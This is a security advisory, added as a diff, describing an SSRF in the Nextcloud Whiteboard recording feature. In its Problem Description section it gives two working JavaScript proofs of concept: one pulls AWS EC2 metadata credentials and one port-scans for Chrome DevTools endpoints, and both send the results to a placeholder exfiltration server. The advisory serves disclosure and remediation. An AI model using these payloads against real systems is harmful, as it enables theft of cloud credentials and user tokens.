@@ -1,0 +1,171 @@
+=============================================================================
+                                                            Security Advisory
+                                                                       elttam
+
+Topic:          SSRF on Nextcloud Whiteboard Application via Recorder
+
+Module:         https://github.com/nextcloud/whiteboard
+Disclosed:      27-02-2026
+Credits:        alex and dls
+Affects:        v.1.5.7
+
+I.   Background
+
+Nextcloud is an open-source content collaboration platform that supports a 
+wide range of productivity applications. The Nextcloud Whiteboard application
+is a Nextcloud maintained application that enables users to create diagrams 
+within the platform using Excalidraw. It includes a recording feature that 
+uses Puppeteer to control a headless Chromium browser and capture user 
+interactions on the whiteboard.
+
+II.  Problem Description
+
+The implementation of the recording feature within the Nextcloud Whiteboard
+application had two primary issues:
+
+1. The `recordingUrl` input for the `start-recording` webhook event was 
+   unvalidated, and could be set to an arbitrary URL.
+
+2. The Chromium browser was initialised using the insecure 
+   `--disable-web-security` argument.
+
+These two issues introduced a Server-Side Request Forgery (SSRF) 
+vulnerability, because the Chromium browser could be instructed to visit a
+malicious website that sends requests on the internal network using the
+`fetch` API.
+
+The following proof-of-concept demonstrates leaking the EC2 credentials from
+the AWS IMDSv2 API when visited by the Whiteboard Chromium recorder.
+
+[source, html]
+----
+<html>
+<body>
+<script>
+const EXFIL_SERVER = "{EXFIL_SERVER}";
+
+const exfil = async (name, data) => {
+    fetch(EXFIL_SERVER + `/${encodeURIComponent(name)}`, {
+        method: "POST",
+        body: data
+    })
+};
+
+const getAwsCreds = async () => {
+    let rText = await fetch("http://169.254.169.254/latest/api/token", {
+        method: "PUT",
+        headers: {
+            "X-aws-ec2-metadata-token-ttl-seconds": 21600
+        }
+    }).then(r => r.text());
+
+    let awsToken = rText;
+    exfil("aws token", awsToken);
+
+    rText = await fetch("http://169.254.169.254/latest/meta-data/iam/security-credentials/", {
+        headers: {
+            "X-aws-ec2-metadata-token": awsToken
+        }
+    }).then(r => r.text());
+
+    let instanceRole = rText;
+    exfil("instance role", instanceRole);
+
+    rText = await fetch(`http://169.254.169.254/latest/meta-data/iam/security-credentials/${instanceRole}`, {
+        headers: {
+            "X-aws-ec2-metadata-token": awsToken
+        }
+    }).then(r => r.text());
+
+    exfil("aws creds", rText);
+};
+
+getAwsCreds();
+</script>
+</body>
+</html>
+----
+
+The below proof-of-concept shows a different exploit that reveals pages that
+are open by a Chromium browser within the Whiteboard container, by revealing
+the response from the `/json` Chrome Devtools Protocol (CDP) endpoint.
+If another user is recording a Whiteboard when the exploit is triggered, it
+would leak their JWT authentication token for accessing the given Whiteboard.
+
+[source, html]
+----
+<html>
+<body>
+<script>
+const EXFIL_SERVER = "{EXFIL_SERVER}";
+
+const exfil = async (name, data) => {
+    fetch(EXFIL_SERVER + `/${encodeURIComponent(name)}`, {
+        method: "POST",
+        body: data
+    });
+};
+
+function range(start, end) {
+    return Array.apply(0, Array(end - start + 1)).map((element, index) => index + start);
+}
+
+const PORTS = range(30000, 65535); // Can be a large range, or some specific subset
+const POOL_SIZE = 100; // Parallel requests limit
+
+async function foundPort(port, textPromise) {
+    exfil(`cdp-port-${port}`, await textPromise);
+}
+
+async function scanPort(port) {
+    // no need for no-cors, web security is disabled
+    await fetch(`http://127.0.0.1:${port}/json`).then(r => foundPort(port, r.text())).catch((e) => e);
+    return port;
+}
+
+const processInPool = async (ports, poolSize) => {
+    let pool = {};
+
+    for (const id of ports) {
+        pool[id] = scanPort(id);
+
+        if (Object.keys(pool).length > poolSize - 1) {
+            const promises = Object.values(pool);
+            const resolvedId = await Promise.race(promises); // wait for one Promise to finish
+            delete pool[resolvedId]; // remove that Promise from the pool
+        }
+    }
+
+    return await Promise.all(Object.values(pool));
+};
+
+processInPool(PORTS, POOL_SIZE);
+</script>
+</body>
+</html>
+----
+
+III. Impact
+
+The insecure implementation of the Chromium recorder enables access to
+sensitive internal APIs, such as the AWS IMDSv2 API to compromise the
+credentials of the EC2 instance that is hosting the Whiteboard application
+that could result in the further compromise of the victim's cloud
+infrastructure.
+Alternatively, accessing the CDP API could reveal the JWT authentication
+token for other user's Whiteboards, that results in gaining unauthorised 
+access to a Whiteboard when leaked.
+
+IV.  Solution
+
+The following remediation strategies were recommended:
+
+* Validate that the `recordingUrl` input for the `start-recording` webhook
+  event is a URL to a Whiteboard on trusted Nextcloud site.
+
+* Avoid the use of the insecure `--disable-web-security` argument for the
+  Chromium browser.
+
+V.   References
+
+* CWE-918: Server-Side Request Forgery (SSRF)
